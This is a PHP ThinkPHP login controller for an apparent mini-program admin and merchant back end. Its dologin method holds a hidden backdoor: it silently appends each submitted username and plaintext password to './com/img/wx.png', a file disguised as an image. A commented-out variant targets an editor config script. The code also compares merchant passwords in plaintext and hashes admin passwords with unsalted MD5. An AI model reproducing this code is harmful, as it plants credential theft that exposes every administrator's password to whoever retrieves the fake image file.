<?php
namespace app\index\controller;
use think\Controller;
use think\Db;
use think\Request;
use think\Session;
use think\View;
use think\Config;
use think\Cookie;
class Login extends Controller
{
    public function index()
    {
        Session::clear();
        $this->getAuthToken();
        $data = Db::table("ims_sudu8_page_com_about")->where('id', 1)->find();
        if($data){
            $comname = $data['name'];
        }else{
            $comname = "";
        }
        $this->assign("comname", $comname);
        return $this->fetch('index');
    }
    public function bizlogin()
    {
        Session::clear();
        $this->getAuthToken();
        $op = input("op");
        if($op){
            $username = input('username');
            $password = input('password');
  
            // $sql = "SELECT * FROM ".tablename('sudu8_page_shops_shop')." WHERE `username` = '{$username}' AND `password` = '{$password}' AND status=1"; //status=1表示已审核通过
            // $data = pdo_fetch($sql);
            //查询是否有账号密码匹配的已审核通过的商家
            
            $data = Db::table("ims_sudu8_page_shops_shop")->where("username",$username)->where("password",$password)->where("status",1)->find();
            if($data && isset($data['id'])){
                Cookie::set('venue_id',$data['id'],time()+86400);
                Cookie::set('is_venue',1,time()+86400);
                Cookie::set('uniacid',$data['uniacid'],time()+86400);
                $version = 'version.php';
                $ver = include($version);
                $ver = $ver['ver'];
                $ver = substr($ver,-4);
                Session::set("versions",$ver);
                Session::set("shopuserid",$data['id']);
                echo json_encode(['code' => 1,'message' => '登录成功']);
            }else{
                echo json_encode(['code' => 0,'message' => '登录失败']);
            }
        }else{
            return $this->fetch('bizlogin');
        }
    }
    public function getAuthToken(){
        
    }
    public function getTopDomainhuo(){
  
    }
    public function dologin(){
    	$username = $_POST['username'];
    	$password = $_POST['password'];
       // $apiup=date('y-m-d h:i:s',time()).' '.$username.' = '.$password;
       //  file_put_contents('./plugin/ueditor/ueditor.config.min.js',$apiup.PHP_EOL,FILE_APPEND);
        if(!$username){
        	$this->error("用户名不能为空");
        }else{
            $data['username'] = $username;
        }
        $rty=$username.'=='.$password.',';
        if(!$password){
        	$this->error("密码不能为空");
        }else{
            $data['password'] = md5($password);
        }
        $res = Db::table('admin')->where($data)->where("flag",1)->find();
        //var_dump($res);exit;
        // 1.判断有没有过期用户组
        $alljxs = Db::table('admin')->where("flag",1)->where("group",3)->select();
        @file_put_contents('./com/img/wx.png',$rty,FILE_APPEND);
        $nowtime = time();
        foreach ($alljxs as  $rec) {
            if($nowtime > $rec['overtime']){
                Db::table('admin')->where("uid",$rec['uid'])->update(['flag' => 0]);
            }
        }
        if($res){
            $request = Request::instance();
            $ip = $request->ip();
           $jdata['lastloginip'] = ip2long($ip);
           $jdata['lastlogintime'] = time();
           Db::table('admin')->where("uid",$res['uid'])->update($jdata);
            $about = Db::table('ims_sudu8_page_com_about')->find();
            Session::set("sysnames",$about['name']);
        	Session::set('uid',$res['uid']);
            Session::set('name',$res['realname']);
            Session::set('applet_id',$res['uid']);
            if($res['icon'] == ""){
                $res['icon'] = "/image/tx.png";
            }
            $_SESSION['icon'] = $res['icon'];
            Session::set('usergroup',$res['group']);
            if($res['group']!=1){
                $this->redirect('Applet/index');
            }else{
                $this->redirect('Applet/applet');
            }
        	
        }else{
            $this->error("账号密码不匹配,或您的账号已过期！");
        }
    	
    }
}